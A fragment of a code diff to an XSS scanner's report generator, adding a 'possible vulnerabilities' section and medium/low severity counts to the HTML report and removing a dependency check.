         waf_status = f"✅ No WAF detected" if not scan_result.waf_detected else f"⚠️ WAF detected: {scan_result.waf_type}"
 
         # Vulnerabilities HTML
-        vulnerabilities_html = ""
+        vulnerabilities_html_detected = ""
         for vuln in scan_result.vulnerabilities:
             vuln_class = vuln.severity.lower()
-            vulnerabilities_html += f"""
+            vulnerabilities_html_detected += f"""
             <div class="vuln-card {vuln_class}">
                 <h3>
                     <span class="badge {vuln_class}">{vuln.severity.upper()}</span>
-                    {html.escape(vuln.type.title())} XSS - {html.escape(vuln.url)}
+                    {html.escape(vuln.type.title())} XSS - <span class="vuln-url">{html.escape(vuln.url)}</span>
                 </h3>
                 <p><strong>Parameter:</strong> {html.escape(vuln.parameter or 'N/A')}</p>
                 <p><strong>Payload:</strong> <code>{html.escape(vuln.payload or 'N/A')}</code></p>
@@ -3125,6 +3562,30 @@ CWE: {', '.join(vuln.cwe)}</pre>
             </div>
             """
 
+        vulnerabilities_html_possible = ""
+        for vuln in scan_result.possible_vulnerabilities:
+            vuln_class = vuln.severity.lower()
+            vulnerabilities_html_possible += f"""
+                    <div class="vuln-card {vuln_class}">
+                        <h3>
+                            <span class="badge {vuln_class}">{vuln.severity.upper()}</span>
+                            {html.escape(vuln.type.title())} XSS - <span class="vuln-url">{html.escape(vuln.url)}</span>
+                        </h3>
+                        <p><strong>Parameter:</strong> {html.escape(vuln.parameter or 'N/A')}</p>
+                        <p><strong>Payload:</strong> <code>{html.escape(vuln.payload or 'N/A')}</code></p>
+                        <p><strong>Evidence:</strong> {html.escape(vuln.evidence or 'N/A')}</p>
+                        <p><strong>Confidence:</strong> {vuln.confidence * 100:.1f}%</p>
+                        <details>
+                            <summary>Show Details</summary>
+                            <pre>URL: {html.escape(vuln.url)}
+        Method: {vuln.method}
+        Location: {vuln.location or 'N/A'}
+        CWE: {', '.join(vuln.cwe)}</pre>
+                        </details>
+                    </div>
+                    """
+
+
         # Statistics rows
         stats_rows = ""
         for vuln_type, count in scan_result.statistics.get('vulnerabilities_by_type', {}).items():
@@ -3139,9 +3600,12 @@ CWE: {', '.join(vuln.cwe)}</pre>
             pages_scanned=scan_result.pages_scanned,
             critical_count=critical_count,
             high_count=high_count,
+            medium_count=medium_count,
+            low_count=low_count,
             tech_tags=tech_tags,
             waf_status=waf_status,
-            vulnerabilities_html=vulnerabilities_html,
+            vulnerabilities_html_detected=vulnerabilities_html_detected,
+            vulnerabilities_html_possible = vulnerabilities_html_possible,
             stats_rows=stats_rows,
             end_time=scan_result.end_time
         )
@@ -3221,8 +3685,7 @@ Examples:
         config.payload_count = 100
         config.scan_types = ['reflected', 'stored', 'dom', 'blind']
 
-    # Check dependencies
-    check_dependencies()
+
 
     try:
         # Create and run scanner
@@ -3285,7 +3748,7 @@ Examples:
         print("=" * 80)
         print(f"Target: {results.target_url}")
         print(f"Pages scanned: {results.pages_scanned}")
-        print(f"Vulnerabilities found: {results.vulnerabilities_found}")
+        print(f"Vulnerabilities found (unique): {results.vulnerabilities_found}")
         print(f"Scan ID: {results.scan_id}")
         print(f"Duration: {results.duration:.2f} seconds")
         print("=" * 80)
@@ -3309,22 +3772,8 @@ Examples:
         sys.exit(1)
 
 
-def check_dependencies():
-    """Check for required dependencies"""
-    missing = []
 
-    if not REQUESTS_AVAILABLE:
-        missing.append("requests")
 
-    if not BS4_AVAILABLE:
-        missing.append("beautifulsoup4")
-
-    if missing:
-        print("Missing dependencies. Install with:")
-        print(f"pip install {' '.join(missing)}")
-        print("\nOptional dependencies for advanced features:")
-        print("  pip install selenium aiohttp js2py lxml")
-        sys.exit(1)
 
 
 # ============================================================================
